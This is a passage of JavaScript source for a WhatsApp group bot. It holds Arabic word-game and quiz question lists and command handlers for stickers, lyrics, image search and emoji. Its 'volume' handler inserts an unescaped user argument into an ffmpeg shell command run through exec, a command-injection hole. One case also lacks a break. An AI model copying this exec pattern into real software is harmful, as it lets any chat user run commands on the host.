" جماد بحرف ⤌ ج  ",
" حيوان بحرف ⤌ ص  ",
" دولة بحرف ⤌ س  ",
" نبات بحرف ⤌ ج  ",
" مدينة بحرف ⤌ ب  ",
" نبات بحرف ⤌ ر  ",
" اسم بحرف ⤌ ك  ",
" حيوان بحرف ⤌ ظ  ",
" جماد بحرف ⤌ ذ  ",
" مدينة بحرف ⤌ و  ",
" اسم بحرف ⤌ م  ",
" اسم بنت بحرف ⤌ خ  ",
" اسم و نبات بحرف ⤌ ر  ",
" نبات بحرف ⤌ و  ",
" حيوان بحرف ⤌ س  ",
" مدينة بحرف ⤌ ك  ",
" اسم بنت بحرف ⤌ ص  ",
" اسم ولد بحرف ⤌ ق  ",
" نبات بحرف ⤌ ز  ",
"  جماد بحرف ⤌ ز  ",
"  مدينة بحرف ⤌ ط  ",
"  جماد بحرف ⤌ ن  ",
"  مدينة بحرف ⤌ ف  ",
"  حيوان بحرف ⤌ ض  ",
"  اسم بحرف ⤌ ك  ",
"  نبات و حيوان و مدينة بحرف ⤌ س  ", 
"  اسم بنت بحرف ⤌ ج  ", 
"  مدينة بحرف ⤌ ت  ", 
"  جماد بحرف ⤌ ه  ", 
"  اسم بنت بحرف ⤌ ر  ", 
" اسم ولد بحرف ⤌ خ  ", 
" جماد بحرف ⤌ ع  ",
" حيوان بحرف ⤌ ح  ",
" نبات بحرف ⤌ ف  ",
" اسم بنت بحرف ⤌ غ  ",
" اسم ولد بحرف ⤌ و  ",
" نبات بحرف ⤌ ل  ",
"مدينة بحرف ⤌ ع  ",
"دولة واسم بحرف ⤌ ب  ",
]
              const xeonidhsisgd = idhsisgd[Math.floor(Math.random() * idhsisgd.length)]
              bufferidhsisgd = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: bufferidhsisgd, caption: '*♚ مرحبا بك في لعبة الحروف*\nꔹ━━━━━ꔹ\n'+ xeonidhsisgd }, {quoted:m})
              break
       
       case 'jtudvu': case 'اسال':
              const jtudvu =[
   "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
  "تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغيرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغيره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
  "من هو الصحابي الذي عند موته اهتز عرش الرحمن؟ ",
"من هي أخر من توفى من زوجات الرسول صلى الله عليه وسلم؟ ",
"سورة ذكرت فيها البسملة مرتين، أذكر اسم السورة مع ذكر أماكنها وأرقام الآيات؟ ",
"ما هي أطول كلمة في القرآن الكريم؟ مع ذكر اسم السورة الموجودة فيها الآية، ورقم الآية؟ ",
"ما هي أطول سورة في القرآن، مع ذكر عدد آياتها؟",
"ما هي أقصر سورة في القرآن الكريم، مع ذكر عدد آياتها؟ ",
" من هي الأم التي لم تلد؟",
"ما الذي يطلق على الميته التي تقع من مكان مرتفع ؟ ",
"ما هو الحيوان الذي إذا تغير دمه أصبح طاهر؟ ",
" سماه الرسول صلى الله عليه وسلم فرعون أمته؟ ",
"من الذي عدلت شهادته شهادة الرجلين؟ ",
"ما أول ما تكلم به رسول الله صلى الله عليه وسلم حين قدم المدينة؟ ",
"ما هو اللقب الذي أطلقته أهل مكة على النبي صلى الله عليه وسلم قبل البعثة؟ ",
"من هو أكبر أعمام النبي صلى الله عليه وسلم؟ ",
"متى كانت غزوة الخندق؟",
"ما هي الأداة الذي قتل بها قابيل لأخيه هابيل؟ ",
"من هو النبي الذي سمى بالذبيح؟ ",
"كم يوم ظل إبراهيم في النار؟ ",
" ما الذي يطلق على الميته التي تقع من مكان ",
" ما هو الحيوان الذي إذا تغير دمه أصبح طاهر؟",
"من هو أول من آمن بنبوة الرسول صلى الله عليه وسلم قبل أن يبعث رسولاً؟ ",
"سورة في القرآن الكريم لم تبدأ بالبسملة، فما هي؟  ",
"من هي السيدة الملقبة بجدة العرب؟ ",
"سورتان في القرآن الكريم معروفتين باسم الزهراوان، فما هما؟ ",
]
              const xeonjtudvu = jtudvu[Math.floor(Math.random() * jtudvu.length)]
              bufferjtudvu = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: bufferjtudvu, caption: '*♚ اتفضل سوال يلا جاوب*\nꔹ━━━━━ꔹ\n'+ xeonjtudvu }, {quoted:m})
              break
       
case 'عكس': {
if (args.length < 1) return m.reply(`مثال:\n${prefix}ونبيس عمك ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
m.reply(`\`\`\`「 عكس الكلمات 」\`\`\`\n*•> النص المدخل :*\n${quere}\n*•> النص المقلوب :*\n${flipe}`)
}
break
case 'toviewonce': case 'toonce': { 
        if (!quoted) return m.reply(`Reply image`)
        if (/image/.test(mime)) {
anuoncr2 = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
ElgazarBot.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anuonce2 = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
        ElgazarBot.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
        }
        }
        break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return m.reply(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return m.reply('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning on antivirus in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return m.reply('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning on nsfw in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning off nsfw in this group')
} else {
  let buttonsntnsfw = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'mediafire': case 'ميديافاير': {
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `الرابط غير صحيح`
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*ملف تجاوز الحد* '+util.format(baby1))
const result4 = `*تحميل ميديافاير*
				
*الاسم* : ${baby1[0].nama}
*الحجم* : ${baby1[0].size}
*التمثيل* : ${baby1[0].mime}
*لينك* : ${baby1[0].link}`
m.reply(`${result4}`)
ElgazarBot.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
case 'lyrics2': {
	    if (!text) return reply(`Use example ${prefix}lyrics Despacito`)
	m.reply(mess.wait)
	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
    m.reply(`
${themeemoji} Title : *${result.title}*
${themeemoji} Author : ${result.author}
${themeemoji} Lyrics : ${result.lyrics}
${themeemoji} Url : ${result.link}
`.trim())
}
break
case 'lyrics':
if (!text) throw `Song name?`
const findLyrics = require('simple-find-lyrics')
try {
const lyrics = await findLyrics(text)
if (lyrics.lyrics == '') return console.log("it's f up")
var txt = `
*${themeemoji} Title :* ${lyrics.title}
*${themeemoji} Artist :* ${lyrics.artist}
*${themeemoji} Lyrics :-* \n
${lyrics.lyrics}`
console.log(lyrics)
 await ElgazarBot.sendMessage(m.chat, {text:txt},{quoted:m})
} catch (err) {
    console.log(err)
    }
    break
        case 'gimage': {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        xeonezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
        n = xeonezyanu.result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
${themeemoji} *Query* : ${text}
${themeemoji} *Media Url* : ${images}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
        break
case 'صوره':
case 'image': case 'صورة': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraperW')
                anuxeonezy2 = await pinterest(text)
                resultkkk3 = anuxeonezy2[Math.floor(Math.random() * anuxeonezy2.length)]
                ElgazarBot.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} رابط الوسائط : `+resultkkk3 }, { quoted: m })
            }
            break
case 'سرقه': case 'زرف': case 'wm': case 'سرقة': {  
if (!args.join(" ")) return m.reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
ElgazarBot.downloadAndSaveMediaMessage(quoted, "gifee")
ElgazarBot.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('بحد أقصى 10 ثواني!')
let media = await quoted.download()
let encmedia = await ElgazarBot.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
m.reply(`ارسل صوره او فيديو واكتب ${prefix + command}\nمدة الفيديو 1-9 ثواني`)
}
}
break
case 'ايموجي': {
if (!args.join(" ")) return m.reply('اين هو الايموحي?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await ElgazarBot.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `حقوق: ${global.botname}`}, {quoted:m})
await ElgazarBot.sendMessage(from, {text:"رد علي الصوره واكتب ستيكر"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
media = await ElgazarBot.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
ElgazarBot.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
ElgazarBot.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
m.reply("Send video/audio")
}
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper': case 'animewall': {
                if (!args.join(" ")) return m.reply("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `.wallpaper ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: `${botname}`,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'animewall2': case 'animewallpaper2':
m.reply(mess.wait)						
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return m.reply('What wallpaper do you want?')
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);
var walb = [
        {buttonId: `.${command} ${q}`, buttonText: {displayText: `Next ✨`}, type: 1},        
        ]
      let wal = {
       image: {url:wallpaper[i].image},
       caption: `*Query :* ${q}`,
      footer: `${global.botname}`,
      buttons: walb,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//ElgazarBot.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'igemoji': 
case 'instagramemoji': 
if (!q) return m.reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "10")
break
